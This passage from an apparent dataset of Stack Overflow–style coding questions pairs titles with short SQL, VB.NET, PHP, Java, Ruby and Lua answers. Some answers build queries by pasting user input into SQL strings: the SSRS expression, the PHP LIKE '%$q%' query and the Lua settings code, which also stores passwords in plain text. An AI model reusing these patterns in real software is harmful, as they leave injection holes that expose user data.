Private nameAndValueSeparator = ""="" ' between name and value
Private xOffset = 10 ' for horizontal spacing inside the groupbox
Private yOffset = 20 ' for vertical spacing inside the groupbox

Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
    ' your example data
    Dim testString = ""WEIGHT=10;WIDTH=5;LENGTH=5""
    ' set the textboxes
    setTextBoxes(testString)
    ' get the string from the textboxes
    Dim result = getTextBoxesString()
End Sub

' call to get a string with all the data from the textboxes
Private Function getTextBoxesString() As String
    Dim stringToDatabase = """"
    Dim textBoxes = GroupBox1.Controls.OfType(Of Control).
        Where(Function(co As Control) TypeOf co Is TextBox).
        Select(Of TextBox)(Function(co As Control) CType(co, TextBox))
    Dim nameTextBoxes = textBoxes.Where(Function(co As Control) co.Name.Contains(nameTextBoxName))
    Dim valueTextBoxes = textBoxes.Where(Function(co As Control) co.Name.Contains(valueTextBoxName))
    stringToDatabase = nameTextBoxes.Select(Of String)(
        Function(nameTextBox As TextBox)
            Dim valueTextBox = valueTextBoxes.
                Where(Function(vtb As TextBox) vtb.Name = nameTextBox.Name.Replace(nameTextBoxName, valueTextBoxName)).
                First()
            Return nameTextBox.Text & nameAndValueSeparator & valueTextBox.Text
        End Function).Aggregate(Function(oldValue, newValue) oldValue & paramSeparator & newValue)
    Return stringToDatabase
End Function

' call to set the textboxes inside the groupbox based on the data string
Private Sub setTextBoxes(textBoxesString As String)
    Dim params = textBoxesString.Split(paramSeparator)
    Dim index = 1
    GroupBox1.Controls.Clear()
    For Each param In params
        Dim nameAndValue = param.Split(nameAndValueSeparator)
        Dim nameTextBox As New TextBox With
            {.Name = nameTextBoxName & index.ToString(),
             .Text = nameAndValue(0),
             .Location = New Point(xOffset, (index - 1) * .Height + yOffset)}
        Dim valueTextBox As New TextBox With
            {.Name = valueTextBoxName & index.ToString(),
             .Text = nameAndValue(1),
             .Location = New Point(.Width + xOffset, (index - 1) * .Height + yOffset)}
        GroupBox1.Controls.Add(nameTextBox)
        GroupBox1.Controls.Add(valueTextBox)
        index += 1
    Next
End Sub
"
14148,404,SQL Insert newest value from another table,"UPDATE inland SET lt_dispatch_level = obs.named_lt_dispatch_level 
FROM obs WHERE obs.created_at = (SELECT MAX(created_at) 
FROM obs) AND inland.cartodb_id = 1
"
31364,71900,"SQL FOR XML Path, returning multiple child elements","select 'test1' as [Property/@name],
       'text1' as Property,
       null,
       'test2' as [Property/@name],
       'text2' as Property,
       null,
       'test3' as [Property/@name],
       'text3' as Property,
       null,
       'test4' as [Property/@name],
       'text4' as Property
for xml path(''), root('Root');
"
14245,43767,Get content of first 5 rows and echo them,"$result = mysqli_query($con,""select post from facebook_posts where p_id >  (select MAX(p_id) - 5 from facebook_posts)"");
while ($row = $result->fetch_array(MYSQLI_ASSOC))
{
  echo $row['post'];
  echo '<br/>';
}
"
30921,45893,Update a constraint in postgresql 9.1 database,"ALTER TABLE T1 DROP CONSTRAINT fk_T1;

ALTER TABLE T1 ADD CONSTRAINT fk_T1 FOREIGN KEY (id1)
REFERENCES T2 (id1) MATCH SIMPLE
ON UPDATE CASCADE ON DELETE CASCADE;
"
4370,13617,SQL How to Update only first Row,"UPDATE Table SET Checked='Y' 
WHERE ID =(SELECT ID FROM Table WHERE Checked='N' ORDER BY ID LIMIT 1) 
"
34766,136,Create unique ID based on grouped UserId,"select (left(userid, 4)+right(100000 +
                              row_number() over (partition by userid order by datefield), 4)
       )
"
28370,30117,SQL Select query to pull multiple values from the same row as individual rows," select 'CTY_CD' AS Type,  CTY_CD AS Code FROM tableName WHERE CTY_CD = 'DEN'
 UNION
 select 'STATE_CD' AS Type, STATE_CD AS Code FROM tableName WHERE CTY_CD = 'DEN'
 UNION
 select 'COUNTRY_CD' AS Type, COUNTRY_CD AS Code FROM tableName WHERE CTY_CD = 'DEN'
"
12115,2572,SQL - group session log entries and order the groups by session start time,"select  yt.item_id
,       yt.item_datetime
,       yt.app
,       yt.action
,       yt.session_id
from    (
        select  session_id
        ,       min(item_datetime) as MinDate
        from    YourTable
        group by
                session_id
        ) sessions
left join
        YourTable yt
on      yt.session_id = sessions.session_id
order by
        session.MinDate
,       yt.item_datetime
"
21619,66090,Simple MySQL select taking too much time,"alter table Product add index cat_title_idx(CatID,Title);
"
18951,8752,What is the 'N' when you are dealing with SQL such as (N''),"SELECT N'This is a test'; -- NVarChar data
SELECT 'Test is a test'; -- VarChar data
"
19068,72291,How can I remove duplicates in SQL but keep one copy?,"DELETE FROM t
WHERE rowid NOT IN (
  SELECT min(rowid) FROM t
  GROUP BY orderid, type
)
"
37161,50453,Oracle select across a group of tables by partial name,"declare
    vSQL varchar2(32767);
    type tabNum is table of number;
    vResult tabNum;
begin
    select listagg( 'select cust_number from ' || owner || '.' || table_name,
                    ' UNION ALL '
                  ) within group ( order by null)
    into vSQL
    from dba_tables
    where table_name like 'PAY0%' OR  table_name like 'PAY1%';    
    --
    dbms_output.put_line(vSQL);
    --
    execute immediate vSQL bulk collect into vResult;
    --    
    for i in vResult.first .. vResult.last loop
        dbms_output.put_line(vResult(i));
    end loop;
end;
"
11929,69481,Count of one of the columns,"SELECT *,
    COUNT(*) OVER(PARTITION BY col1)
FROM tab1
"
10306,61992,Mysql: Optimizing finding super node in nested set tree,"ALTER TABLE projects ADD sets LINESTRING;

UPDATE  projects
SET     sets = LineString(Point(-1, lft), Point(1, rgt));

ALTER TABLE projects MODIFY sets LINESTRING NOT NULL;

CREATE SPATIAL INDEX sx_projects_sets ON projects (sets);

SELECT  hp.*
FROM    projects hp
WHERE   MBRWithin(Point(0, 4), hp.sets)
ORDER BY
        lft;
"
31723,73123,why sybase index size is much bigger than data itself,"reorg rebuild <TABLE>
"
23388,73344,MySql union query with table name,"select col1,col2,...,coln,'Table1' as Tablename from table1
Union
select col1,col2,...,coln,'Table2' as Tablename from table2
"
1812,835,SQL Query to return records with and without sub-records,"SELECT Clients.ID, Clients.Code, Clients.Name, Commission.Percent
FROM Clients
LEFT JOIN Commission ON Commission.ClientCode = Clients.Code
"
20754,22456,PostgreSQL - count data as zero if it is null (when where clause is used),"SELECT opp.name as name,
       count(log.stage_id) as stage_count
FROM crm_lead as opp 
  LEFT JOIN crm_lead_stage_log as log 
         ON opp.id = log.opportunity_id
        AND log.create_date > '2014-01-28 08:49:03'
GROUP BY name;
"
8637,53815,Copy selections from two related tables,"INSERT INTO tab2(id1, id2, relationship)
SELECT (SELECT id
        FROM tab1
        WHERE ""set"" = 37
          AND name = (SELECT name
                      FROM tab1
                      WHERE id = tab2.id1)),
       (SELECT id
        FROM tab1
        WHERE ""set"" = 37
          AND name = (SELECT name
                      FROM tab1
                      WHERE id = tab2.id2)),
       relationship
FROM tab2
WHERE id1 IN (SELECT id
              FROM tab1
              WHERE ""set"" = 3)
   OR id2 IN (SELECT id
              FROM tab1
              WHERE ""set"" = 3)
"
34809,37723,Cakephp virtual field if this column empty use this column,"public $virtualFields = array(
'customer' => ""IF(Contact.company IS NULL OR Contact.company = '', CONCAT(Contact.first_name, ' ', Contact.last_name, ' ', Contact.company), Contact.company)""
);
"
15558,5376,Round up a value to the nearest power of 2 in MySQL query,"FLOOR(POW(2,CEIL(LOG2(1025))))
"
7780,60494,Using ORDER BY and getting most recent version of records,"select id, ""DATE"", COL_A
from (select v.*,
             max(""DATE"") over (partition by substr(col_A, 1, 1),
                                            substr(col_A, 8)
                              ) as maxdate
      from versiones v
     ) v
where ""DATE"" = maxdate;
"
6227,24732,Can we allow user to only select one parameter at a time in SSRS,"= ""SELECT * FROM dbo.Trips WHERE "" + Parameters!WhatField.Value + "" between '"" + FormatDateTime(Parameters!StartDate.Value, dateformat.shortdate) + ""' and '"" + FormatDateTime(Parameters!EndDate.Value, dateformat.shortdate) + ""'""
"
4245,11609,Database query on a non-dense index,"SELECT COUNT(*) FROM EMPLOYEE WHERE SALARY < 10,000
"
27667,13858,Quickest way to restore a record from a SQL Server 2008 MDF file,"insert into originaldb.dbo.Persons 
select * from backupdb.dbo.Persons where PersonId = '654G'
"
11620,70320,Sorting data according to current date,"SELECT * FROM posts
ORDER BY
    DATE(published_at)=DATE(NOW()) DESC,
    DATE(published_at)<DATE(NOW()) DESC,
    DATE(published_at)>DATE(NOW()) ASC`
"
26824,13366,Retrieve data from tables where one has multiple columns pointing to the same primary key in the other?,"FROM (
SELECT Account.*
FROM   (SELECT Contract.Account_Id          AS ForeignKey_Id,
               Contract.DeliveryAddress_Id AS Address_Id
        FROM   Contract
        UNION
        SELECT Contract.Account_Id          AS ForeignKey_Id,
               Contract.DeliveryAddress_Id AS Address_Id
        FROM   Contract
        UNION
        SELECT Contract.Account_Id          AS ForeignKey_Id,
               Contract.BillingAddress_Id AS Address_Id
        FROM   Contract) ContractInfo
       JOIN Account Account
         ON Account.Name_Id = ForeignKey_Id
       JOIN Address
         ON Address.Address_Id = ContractInfo.Address_Id
            AND Address.PostalCode = 'ABCDE'
UNION
SELECT Account.*
FROM   (SELECT Contract.Responsible_Id        AS ForeignKey_Id,
               Contract.DeliveryAddress_Id AS Address_Id
        FROM   Contract
        UNION
        SELECT Contract.Responsible_Id        AS ForeignKey_Id,
               Contract.DeliveryAddress_Id AS Address_Id
        FROM   Contract
        UNION
        SELECT Contract.Responsible_Id        AS ForeignKey_Id,
               Contract.BillingAddress_Id AS Address_Id
        FROM   Contract) ContractInfo
       JOIN Account Account
         ON Account.Name_Id = ForeignKey_Id
       JOIN Address
         ON Address.Address_Id = ContractInfo.Address_Id
            AND Address.PostalCode = 'ABCDE'
UNION
SELECT Account.*
FROM   (SELECT Contract.Holding_Id     AS ForeignKey_Id,
               Contract.DeliveryAddress_Id AS Address_Id
        FROM   Contract
        UNION
        SELECT Contract.Holding_Id     AS ForeignKey_Id,
               Contract.DeliveryAddress_Id AS Address_Id
        FROM   Contract
        UNION
        SELECT Contract.Holding_Id    AS ForeignKey_Id,
               Contract.BillingAddress_Id AS Address_Id
        FROM   Contract) ContractInfo
       JOIN Account Account
         ON Account.Name_Id = ForeignKey_Id
       JOIN Address
         ON Address.Address_Id = ContractInfo.Address_Id
            AND Address.PostalCode = 'ABCDE'
) Account
"
28852,14051,Update multiple columns in SQL with bound multi-part identifier,"update table_1
  set field_1 = table_2.value_1
  from table_1
    inner join table_2
      on (table_1.id = table_2.id)
"
39097,30579,How to notify no of databases added in android,"package org.anddev.android.statusbarnotificator;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;

public class StatusbarNotificator extends Activity {

        private NotificationManager mNotificationManager;
        private int YOURAPP_NOTIFICATION_ID;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle icicle) {
        super.onCreate(icicle);
        setContentView(R.layout.main);

        // Get the notification manager service.
        mNotificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

        /* Show a sample notification when the first button was clicked. */
        findViewById(R.id.btn_showsample).setOnClickListener(new OnClickListener(){
                        @Override
                        public void onClick(View v) {
                                StatusbarNotificator.this.showNotification(
                                                R.drawable.tinyandroid,
                                                R.string.notif_short,
                                                R.string.notif_detailed,
                                                false);
                        }
        });

        /* Clear the notification. */
        findViewById(R.id.btn_clear).setOnClickListener(new OnClickListener(){
                        @Override
                        public void onClick(View v) {
                                StatusbarNotificator.this.mNotificationManager.cancel(YOURAPP_NOTIFICATION_ID);
                        }
        });
    }

    private void showNotification(int statusBarIconID, int statusBarTextID, int detailedTextID, boolean showIconOnly) {
        // This is who should be launched if the user selects our notification.
        Intent contentIntent = new Intent(this, StatusbarNotificator.class);

        // This is who should be launched if the user selects the app icon in the notification.
        Intent appIntent = new Intent(android.content.Intent.VIEW_ACTION,
                        Uri.parse(""http://www.anddev.org""));

        // choose the ticker text
        String tickerText = showIconOnly ? null : this.getString(statusBarTextID);

        mNotificationManager.notify(
                   YOURAPP_NOTIFICATION_ID, // we use a string id because it is a unique
                                                      // number.  we use it later to cancel the
                                                      // notification
                   new Notification(
                       this,                        // our context
                       statusBarIconID,             // the icon for the status bar
                       tickerText,                  // the text to display in the ticker
                       System.currentTimeMillis(),  // the timestamp for the notification
                       ""anddev.org - Notification"", // the title for the notification
                       getText(detailedTextID),     // the details to display in the notification
                       contentIntent,               // the contentIntent (see above)
                       R.drawable.icon,                         // the app icon
                       ""anddev"",                                        // the name of the app
                       appIntent));                 // the appIntent (see above)
    }
}
"
33863,50759,SQL Server determine if values are monotonous,"SELECT CASE WHEN COUNT(*) = 0 THEN 1 ELSE 0 END AS IsMonotone
FROM (
    SELECT ROW_NUMBER() OVER (ORDER BY measDate) AS RowNum, measValue
    FROM Measurements
) T1 INNER JOIN (
    SELECT ROW_NUMBER() OVER (ORDER BY measValue) AS RowNum, measValue
    FROM Measurements
) T2 ON T1.RowNum = T2.RowNum
WHERE T1.measValue <> T2.measValue
"
4093,1791,How to pivot all rows value using sql,"select ID,[A],[B],[C] 
from(
    select *,row_number() over (partition by grp order by grp) Col from #temp1
)x pivot
     (MAX(find)
      for grp in ([A]
      ,[B]
      ,[C])) as y
"
13734,42688,MySQL Select multiple rows from one row in 2 different tables,"select AID
from table B
group by AID
having sum(BID = 1 AND BV = 1) > 0 and
       sum(BID = 2 AND BV = 1) > 0;
"
5336,58571,SQL - Group by Elements of Comma Delineation,"select b.Item, Count(*) from IEG.vServiceIEG a
cross apply (
 Select * from dbo.Split (a.resource_list,',')
   ) b
Group by b.Item
order by 2 desc
"
10913,44418,How would you design a table to keep track of users' likes and dislikes in mysql,"user_likes (user_id, product_id, like_type)
"
14415,60407,Avoid duplicates rows which have one different column value in SQL Server,"SELECT   formId, name, MIN(mark) AS mark
FROM     my_table
GROUP BY formId, name
"
24541,25248,Trying to capture all of the Row_Numbers with Rows > 1,"COUNT(*) OVER(PARTITION BY m.memberfirstname+' '+m.memberlastname,m.MemberDOB,s.GroupID ORDER BY m.MemberDOB) CountNo
"
22128,3585,Referencing a value from the previous row,"Select VNo,CurrKM, LAG(CurrKM,1,0) over (order by VNo asc) LastKM
From Table
"
34704,37521,Sql Select by join,"SELECT SUM(Quantity) Balance FROM (
  SELECT  Quantity FROM PurchaseDetails WHERE ProductId='Pro_1' 
  UNION ALL
  SELECT -Quantity FROM SalesDetails    WHERE ProductId='Pro_1' 
)z;
"
12413,73283,SQL Server 2005 Table-valued Function weird performance,"CREATE INDEX IX_call_company_date ON call (company_id, date)
"
36285,71098,"I want to count the CourseName like(4,2,5) in ""Numbers Of Courses"" column, but the output is being displayed full courseName","SELECT CONCAT( FName, ' ', LName ) AS ""Faculty Names"",
COUNT(course.CourseName) AS 'NUmbers Of Courses', faculty.FacultyID
FROM Faculty 
LEFT JOIN course ON (course.FacultyID = faculty.FacultyID) 
GROUP BY faculty.FacultyID, ""Faculty Names""
ORDER BY faculty.FacultyID 
"
37461,52420,SQL Server rand() aggregate,"WITH cte AS
(
    SELECT
    	intID,
    	ROW_NUMBER() OVER
    		(
    			PARTITION BY geoLat, geoLng
    			ORDER BY NEWID()
    		) AS row_num,
    	COUNT(intID) OVER (PARTITION BY geoLat, geoLng) AS TotalCount
    FROM
    	dbo.Documents
)
SELECT TOP (@maxcount)
    intID, RAND(intID)
FROM
    cte
WHERE
    row_num = 1 + FLOOR(RAND() * TotalCount)
"
27939,55194,How to modify values while extracting them from XML data in SQL Server,"SELECT  a.value('(ID)[1]','int') as ID,
case 
  when a.value('(Show/@Pointer)[1]', 'varchar(5)') = 'yes' then '1'
  else '0'
End case as 'ShowItem',
a.value('Display[1]/@Pointer[1]=""Display""', 'varchar(10)') as DisplayDetails, -- Set to 'true' or 'false'
a.value('DisplayDetails[1][@Pointer[1]=""Display""]/Detail1[1]', 'varchar(max)') as Detail1
FROM    @XMLNODE t
cross apply
t.doc.nodes('//OldItem') x(a)
"
37354,52632,Bulk user delete with same email,"DELETE FROM users    
WHERE email LIKE '%trash-mail.com'
"
32105,26387,Left outer join on two columns performance issue,"SELECT col1, col2
FROM table1, table2
WHERE table1.person_uid = table2.person_uid (+)
AND table1.period = table2.period (+)
"
5131,5030,restore backup mysql,"mysql -u username -p -h hostname databasename < dumpfile.sql
"
16347,59774,Selecting numbers into array and then looping over them,"declare 
    type idArray is table of number index by pls_integer;
  theIdArray idArray;
begin

  select id bulk collect into theIdArray from table_name_here where report_id = 3449;
end;
"
38915,43628,"Query, check where values are the same","ON formas.id_f = SMS_SERVISI.IDTICKET
"
34535,72426,It is possible to fetch with a single SQL the minimum (maximum) row in the table when the compared value is combined of two separate fields?,"SELECT TOP 1 
    Field1, Field2, 
    dateadd(ms, MillisecondsField, DateWithoutMillisecondsField) TimeStamp
FROM Table
ORDER BY TimeStamp DESC
"
3513,48531,SQL for delete query,"DELETE teammembers FROM teammembers
JOIN teams on teammembers.teamId = teams.teamId
WHERE teams.eventId = 1
"
1300,32629,SQL Join Statement based on date range,"SELECT A.*, B.*
FROM CDRLOGS A
INNER JOIN Employees B
  ON A.SRC = B.EmpExt
  AND A.CallDate between B.extStartDate and coalesce(B.extEndDate,getdate())
"
31750,55163,SQL Many to Many relationship,"CREATE TABLE ABC
(
RCTID INT,
RID INT
)
INSERT INTO ABC VALUES (3,92728)
INSERT INTO ABC VALUES (3,92729)
INSERT INTO ABC VALUES (8,92729)
INSERT INTO ABC VALUES (29,92729)
INSERT INTO ABC VALUES (12,92729)
INSERT INTO ABC VALUES (2,92729)
INSERT INTO ABC VALUES (3,92730)
INSERT INTO ABC VALUES (8,92730)
INSERT INTO ABC VALUES (8,92731)
INSERT INTO ABC VALUES (1,92731)
GO
CREATE TABLE TABLEVALUEPARAMETER
(
VID INT
)
INSERT INTO TABLEVALUEPARAMETER VALUES (3)
INSERT INTO TABLEVALUEPARAMETER VALUES (8)
GO
SELECT RID FROM ABC WHERE RCTID IN (SELECT VID FROM TABLEVALUEPARAMETER) GROUP BY
RID HAVING COUNT(RID) = (SELECT COUNT(VID) FROM TABLEVALUEPARAMETER)
GO
"
953,3098,How to convert SQL column null value to 0 and varchar to decimal in sql query,"SELECT 
    COALESCE(CAST(debit as DECIMAL(9,2)),0) as debit,
    COALESCE(CAST(credit as DECIMAL(9,2)),0) as credit,
    sum_accname,
    sum_date, 
    sum_description
FROM 
    sum_balance
"
6663,6900,Is there any other way that we can take auto backup in oracle 11g apart from RMAN?,"DECLARE
devtype varchar2(256);
done boolean;
BEGIN
devtype := dbms_backup_restore.DeviceAllocate (type => '',ident => 'FUN');
dbms_backup_restore.RestoreSetDatafile;
dbms_backup_restore.RestoreDatafileTo(dfnumber => 1,toname => 'D:\ORACLE_BASE\datafiles\SYSTEM01.DBF');
dbms_backup_restore.RestoreDatafileTo(dfnumber => 2,toname => 'D:\ORACLE_BASE\datafiles\UNDOTBS.DBF');
--dbms_backup_restore.RestoreDatafileTo(dfnumber => 3,toname => 'D:\ORACLE_BASE\datafiles\MYSPACE.DBF');
dbms_backup_restore.RestoreBackupPiece(done => done,handle => 'D:\ORACLE_BASE\RMAN_BACKUP\MYDB_DF_BCK05H2LLQP_1_1', params => null);
dbms_backup_restore.DeviceDeallocate;
END;
/
"
9556,25762,Rails 3 ActiveRecord.. how to join or include tables and get a sum,"class User < ActiveRecord::Base
  has_many :completions
  has_many :quests, :through => :completions

  attr_accessor :total_points

  # calculates points for individual user
  def points
    @total_points ||= quests.reduce(0) { |sum, quest| sum + quest.points }
    # note this doesn't reload, so if you add a completion without reloading the
    # user object this will be stale
  end

  # when getting a list of users, make sure you use an efficient query to
  # fetch all of the associated quests
  # 
  # this is the same as using `scope :with_quests, include(:quests)`
  def self.with_quests
    include(:quests)
  end
end

# outside of your model:
@users = User.with_quests.all

# and in a view (e.g. _user.html.erb):
Points: <%= user.points %>
"
29852,37662,"how to join fetch data from two table with using (like, limit and order by)","SELECT name from
(
SELECT name FROM live_search 
UNION 
SELECT name FROM php_test 
) tab
WHERE name LIKE '%$q%' order by name ASC LIMIT 10
"
11936,61399,How to handle NULL in Where?,"WHERE statusid IS NULL OR  statusid not in (select statusid from statuses where statusname='deleted')
"
34145,46428,SQL Replace() table join only replaces trailing text,"SELECT InitialString, ReplacementTarget, ReplacementValue, 
       REPLACE(InitialString, RTRIM(ReplacementTarget), RTRIM(ReplacementValue)) 
            AS ReplacedString
FROM   StringTable CROSS JOIN ReplacementTable
"
37569,31014,Change Primary Key Master Details Tables SQL,"DECLARE @Temp TABLE (TempID INT IDENTITY(1,1), ID INT)

INSERT INTO @Temp (ID)
SELECT ID FROM MasterTBL
SET @Total = @@ROWCOUNT

DECLARE @Count INT = 1
DECLARE @ID INT

WHILE @Count <= @Total
BEGIN

    SET @ID = (SELECT ID FROM @Temp WHERE TempID = @Count)

    -- Update Details Table
    UPDATE DetailsTBL SET MasterID = @Count WHERE MasterID = @ID

    -- Update Master Table
    UPDATE MasterTBL SET ID = @Count WHERE ID = @ID

    SET @Count = @Count + 1
END
"
14206,1306,get totals of invoice collection: total incl. - total excl. - tax by types,"Select code, SUM(amount) 
    from sales_order_tax 
group by code
"
34722,807,"Return one value if a query has 1 row, otherwise return another value","SELECT
  ...,
  bookmarks.photo_id
FROM photos, users, themes
LEFT JOIN bookmarks ON bookmarks.photo_id=? AND photos.facebook_id=users.facebook_id
WHERE
  ...
LIMIT 1
"
15104,75041,Calculate business days in Oracle SQL(no functions or procedure),"SELECT OrderNumber, InstallDate, CompleteDate,
  (TRUNC(CompleteDate) - TRUNC(InstallDate) ) +1 - 
  ((((TRUNC(CompleteDate,'D'))-(TRUNC(InstallDate,'D')))/7)*2) -
  (CASE WHEN TO_CHAR(InstallDate,'DY','nls_date_language=english')='SUN' THEN 1 ELSE 0 END) -
  (CASE WHEN TO_CHAR(CompleteDate,'DY','nls_date_language=english')='SAT' THEN 1 ELSE 0 END) as BusinessDays
FROM Orders
ORDER BY OrderNumber;
"
27513,1032,How to add Floating(decimal) hour in DateTime's DATEADD function?,"SELECT DATEADD(Second, 0.5 * 60 * 60, GETDATE()) 
"
11871,4388,MySQL Contact multiple right joined rows into one column,"SELECT   u.id, u.user, GROUP_CONCAT(s.state)
FROM     users u
JOIN     states s ON u.id = s.user_id
GROUP BY u.id, u.user
"
15404,37853,complex paratition sum in postgresql,"Select .....,
       (coalesce( SUM(a.qty) OVER (PARTITION BY a.itemid), 0) -
        coalesce( SUM(a.qty) OVER (PARTITION BY a.itemid, a.deliveryid), 0)
       ) as qtyOther
"
26231,47582,Need help with SQL subquery,"SELECT *
FROM   `fieldlist`
WHERE  id IN (SELECT SUBSTRING(column_name, 5)
              FROM   information_schema.columns
              WHERE  table_name = 'formList_5'
              AND    column_name LIKE 'field_%')  
"
33225,55522,"Combining MySQL tables, also show when other table is nothing found","SELECT ri_posts.*, GROUP_CONCAT(ri_terms.hashtag SEPARATOR ', ') AS hashtags 
FROM ri_posts 
LEFT JOIN ri_terms ON ri_terms.parent_id = ri_posts.id
GROUP BY re_posts.id
"
19238,17563,How to select only one field where id number is the same sql,"SELECT bugID,
       name,
       description,
       STUFF(( SELECT ',' + comment 
                  FROM Table1 I Where I.bugID= O.bugID
                FOR
                  XML PATH('')
                ), 1, 1, '')
FROM   Table1 O
GROUP BY bugID,
       name,
       description
"
21225,74428,Stored Procedure | Check for IF Exists using Joins in 3 tables and update,"    If Object_Id('tempdb.dbo.#estimates_info') Is Not Null
Begin
    Drop Table #estimates_info;
End

If Object_Id('tempdb.dbo.#admin_info') Is Not Null
Begin
    Drop Table #admin_info;
End

If Object_Id('tempdb.dbo.#estimates_info') Is Null
Begin
    Create Table #estimates_info
    (
         Id         Int 
        ,Name       Varchar(100)
    )
End

If Object_Id('tempdb.dbo.#admin_info') Is Null
Begin
    Create Table #admin_info
    (
         Id         Int 
        ,Name       Varchar(100)
    )
End


Insert Into #estimates_info(Id, Name) Values
 (1,'ABC')
,(2,'XYZ')
,(3,'PQR');

Insert Into #admin_info(Id, Name) Values
 (1,'ABC')
,(3,'PQR');


If Exists(  Select  1
            From    (
                        Select   Count(x.Id) As xCount
                                ,Sum(Case When y.Id Is Not Null Then 1 Else 0 End) As yCount
                        From    #estimates_info As x With (Nolock)
                                Left Join #admin_info As y With (Nolock) On x.Id = y.Id
                    ) As t
            Where   t.xCount = t.yCount
        )
Begin
    ---- select * from table
End
Else
Begin   
    ---- your insert code
End
"
14074,13811,Select latest rows,"select t1.description,
  t1.date,
  t1.profile,
  t1.user,
  Replace(t1.locations, ',', '|') locations
from test t1
inner join
(
  select max(date) date, profile, user
  from test
  group by profile, user
) t2
  on t1.user = t2.user
  and t1.date = t2.date
  and t1.profile = t2.profile
where t1.user = 'Timmy'
order by t1.profile
"
1040,13543,Return all rows with redundant where clause,"x = x
"
624,33280,"Join several tables (to fetch user info as 1 row), but one of them is optional (user avatar)","SELECT u.uid AS uid
        , COALESCE(f.filename, 'goatsex.jpg') AS filename
        , g.field_gender_value AS gender_value
        , c.field_city_value AS city_value
FROM drupal_users u
JOIN drupal_field_data_field_gender g ON g.entity_id=u.uid 
JOIN drupal_field_data_field_city c ON c.entity_id=u.uid
LEFT JOIN drupal_file_managed f ON u.picture=f.fid 
WHERE u.name='Alex' 
        ;
"
16305,35936,SQL Query needed to get information from TWO separate tables,"SELECT b.AUTHORID, b.BKTITLE, a.AUTHFNAME, a.AUTHLNAME
FROM BOOK b
  INNER JOIN AUTHOR a
    ON b.AUTHORID = a.AUTHORID
AND b.AUTHORID IN
(
  SELECT AUTHORID
  FROM BOOK
  GROUP BY AUTHORID
  HAVING COUNT(AUTHORID) > 1
)
ORDER BY a.AUTHLNAME, a.AUTHFNAME
"
26276,41788,How do I create an Sqlite3 database using luasql?,"    require 'luasql.sqlite3'
    function opendb(dbname)
    -- Check for Settings Database and create if needed
    local db = fhGetPluginDataFileName()
    local dbenv = assert (luasql.sqlite3())
    -- connect to data source, if the file does not exist it will be created
    dbcon = assert (dbenv:connect(db))
    -- check table for page list
    checkTable(dbcon,'pagelist',
    [[CREATE TABLE pagelist(filename varchar(500), md5hash varchar(32),UNIQUE (filename))
    ]])
    -- create table for settings
    checkTable(dbcon,'settings',
    [[CREATE TABLE settings(key varchar(20), directory varchar(500), 
               host varchar(500), folder varchar(50), userid varchar(50), password varchar(50), UNIQUE (key))
    ]])
    return dbenv,dbcon
end
function checkTable(dbcon,table,createString)
    local sql = string.format([[SELECT count(name) as count FROM sqlite_master WHERE type='table' AND name='%s']],table)
    local cur = assert(dbcon:execute(sql))
    local rowcount = cur:fetch (row, ""a"")
    cur:close()
    if tonumber(rowcount) == 0 then
        -- Table not found create it
        res,err = assert(dbcon:execute(createString))
    end
end
function closedb(dbenv,dbcon)
    dbcon:close()
    dbenv:close()
end
function loadSettings(dbcon)
    local sql = [[SELECT * FROM settings]]
    local cur,err = assert(dbcon:execute(sql))
    local row = cur:fetch({},'a')
    cur:close()
    if row then
        return row
    else
        -- return default values
        return {
            directory = fhGetContextInfo('CI_PROJECT_PUBLIC_FOLDER')..'\\FH Website',
            host = 'websitehost',
            folder = '/',
            userid = 'user',
            password = 'password',
            new = 'yes'
        }
    end
end
function saveSettings(dbcon,settings)
    -- Check for Settings
    if settings.new == 'yes' then
        -- Create
        sql = string.format([[insert into settings (directory, host, folder, userid, password) Values('%s','%s','%s','%s','%s')]],settings.directory,settings.host,settings.folder,settings.userid,settings.password)
    else
        -- Update
        sql = string.format([[update settings set directory = '%s', host = '%s',folder = '%s',userid = '%s', password = '%s']],settings.directory,settings.host,settings.folder,settings.userid,settings.password)
    end
    local res = assert(dbcon:execute(sql))
end
"
14876,664,T-SQL Dynamic table create,"declare @path NVARCHAR(MAX)

SET @path = 'c:\temp\Book2.txt'

    declare @execSQL nvarchar(1000)
    declare @tempstr varchar(1000)
    declare @col varchar(1000)
    declare @table nvarchar(1000)

    -- Create a temp table to with one column to hold the first row of the csv file

  IF Object_id('tempdb..#tbl') IS NOT NULL 
       DROP TABLE #tbl 

      CREATE TABLE #tbl (line VARCHAR(1000))
       SET @execSQL = 
            'BULK INSERT #tbl  
            FROM ''' + @path + '''  
            WITH (  
                     FIELDTERMINATOR ='','',
                     FIRSTROW = 1,  
                     ROWTERMINATOR = ''\n'',
                     LASTROW = 1 
                  )         
           ' 

       EXEC sp_executesql @stmt=@execSQL 

    update #tbl set line = REPLACE(line,' ','_') where line like '% %'


       SET @col = ''
       SET @tempstr = (SELECT TOP 1 RTRIM(REPLACE(Line, CHAR(9), ',')) FROM #tbl)

       DROP TABLE #tbl

    SET @col=@col + LTRIM(RTRIM(SUBSTRING(@tempstr, 1, CHARINDEX(',',@tempstr)-1))) + ' nvarchar(max),'     
    SET @tempstr = SUBSTRING(@tempstr, CHARINDEX(',',@tempstr)+1, len(@tempstr))

       WHILE CHARINDEX(',',@tempstr) > 0
        BEGIN           

           SET @col=@col + LTRIM(RTRIM(SUBSTRING(@tempstr, 1, CHARINDEX(',',@tempstr)-1))) + ' nvarchar(max),'     

           SET @tempstr = SUBSTRING(@tempstr, CHARINDEX(',',@tempstr)+1, len(@tempstr)) 
        END
        SET @col = @col + @tempstr + ' real'


       IF Object_id('tempdb..##temptable') IS NOT NULL 
       DROP TABLE ##temptable 

       SET @table = 'create table ##temptable (' + @col + ')'

       EXEC sp_executesql @stmt=@table


    -- Load data from csv
       SET @execSQL = 
            'BULK INSERT ##temptable
            FROM ''' + @path + '''  
            WITH (  
                     FIELDTERMINATOR ='','',
                     FIRSTROW = 2,  
                     ROWTERMINATOR = ''\n''              
                  )         
           '  

       EXEC sp_executesql @stmt=@execSQL 

select * from ##temptable
"
15849,62516,"SQL - min() gets the lowest value, max() the highest, what if I want the 2nd (or 5th or nth) lowest value?","SELECT  *
FROM    (
    SELECT	a_id, (
    	SELECT b_id
    	FROM mytable mib
    	WHERE mib.a_id = ma.a_id
